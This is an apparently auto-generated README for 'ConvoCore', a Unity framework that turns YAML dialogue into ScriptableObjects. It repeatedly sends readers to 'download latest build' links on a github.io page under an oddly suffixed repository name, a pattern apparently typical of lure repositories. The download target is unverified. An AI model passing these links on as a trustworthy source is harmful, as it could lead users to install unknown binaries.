# ConvoCore - Unity Dialogue Framework 2026

> **ConvoCore is a modular, data-driven dialogue framework for Unity that turns YAML-authored conversations into ScriptableObjects for scalable, editor-friendly narrative workflows.**

[![Platform](https://img.shields.io/badge/Platform-Unity-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/paul-kaiser1963/convocore-win-59916?style=flat-square)](https://github.com/paul-kaiser1963/convocore-win-59916)

---

<p align="center">
  <a href="https://paul-kaiser1963.github.io/convocore-win-59916/">
    <img src="https://img.shields.io/badge/Download-ConvoCore%20Latest-brightgreen?style=for-the-badge" alt="Download ConvoCore">
  </a>
</p>

> **[Direct Download - ConvoCore](https://paul-kaiser1963.github.io/convocore-win-59916/)**

---

[Download Latest Build](https://paul-kaiser1963.github.io/convocore-win-59916/)

---

## About ConvoCore

ConvoCore provides a structured way to build conversations in Unity without tying narrative data to a single presentation layer. Dialogue can be authored in YAML, compiled into ScriptableObjects, and organized for use across projects that need scalable conversation content.

The framework is designed for developers and narrative teams working with multi-character exchanges, expressions, and event-driven dialogue behavior. Its modular architecture allows character representations, interface layers, input handling, and other subsystems to be replaced or extended as a project evolves.

---

## Features

- Author dialogue content in YAML
- Compile conversation data into Unity ScriptableObjects
- Support conversations involving multiple characters
- Extend character representations for different project needs
- Add expression systems to dialogue flows
- Run actions before and after individual lines
- Replace modular framework subsystems
- Substitute UI and input layers independently

---

## Installation

Clone the repository into a location accessible to your Unity project:

```bash
git clone https://github.com/paul-kaiser1963/convocore-win-59916.git
```

Then open or import the `ConvoCore` folder through the Unity Editor. After installation, add YAML dialogue content to the project and use the framework's editor tooling to compile it into ScriptableObject data.

If you are using a packaged distribution, download the latest build and follow the package's included Unity import instructions.

---

## Usage

A typical ConvoCore workflow is:

1. Create a dialogue source in YAML.
2. Define the participants and conversation lines.
3. Add expressions or line hooks where interactive behavior is required.
4. Compile the source into ScriptableObjects through the Unity Editor.
5. Connect the resulting conversation data to the project's UI and input layers.
6. Replace or extend framework subsystems as the project grows.

Example YAML structure:

```yaml
conversation:
  title: Greeting
  characters:
    - Guide
    - Player
  lines:
    - character: Guide
      text: Welcome.
    - character: Player
      text: Thanks for having me.
```

The exact available fields depend on the dialogue data model configured by the project.

---

## Configuration

ConvoCore uses YAML as the authoring format and ScriptableObjects as the compiled Unity representation. Keep source dialogue files organized with the rest of the project's narrative data, then compile them through the available editor tooling.

Project-specific behavior can be shaped through the framework's replaceable components, including:

- Character representations
- Expression handling
- Pre-line hooks
- Post-line hooks
- UI layers
- Input layers
- Other modular subsystems

---

## Requirements

- Unity
- A Unity project that can import the ConvoCore files
- YAML dialogue source files for data-driven authoring
- Sufficient project storage for source assets and compiled ScriptableObjects

No separate runtime or storage requirements are specified in the available project metadata.

---

## FAQ

### Who is ConvoCore for?

ConvoCore is intended for Unity developers and narrative teams building structured, multi-character conversations with editor-assisted data management.

### How are conversations authored?

Dialogue is authored in YAML and then compiled into ScriptableObjects for use within Unity.

### Can the interface or controls be customized?

Yes. The UI and input layers are designed to be replaceable, allowing projects to connect their own presentation and interaction systems.

### Can characters use custom representations?

Yes. Character representations are extensible, making it possible to adapt how participants are displayed or handled.

### Where should project settings be changed?

Dialogue content belongs in YAML source files, while runtime and presentation behavior should be configured through the relevant modular components and Unity project assets.

### What should I check if a conversation does not appear?

Confirm that the YAML source is correctly structured, that it has been compiled into ScriptableObjects, and that the resulting data is connected to the configured UI and input layers.

### How do I get updates?

Check the repository for newer builds, changes to the editor tooling, and updates to the dialogue framework.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
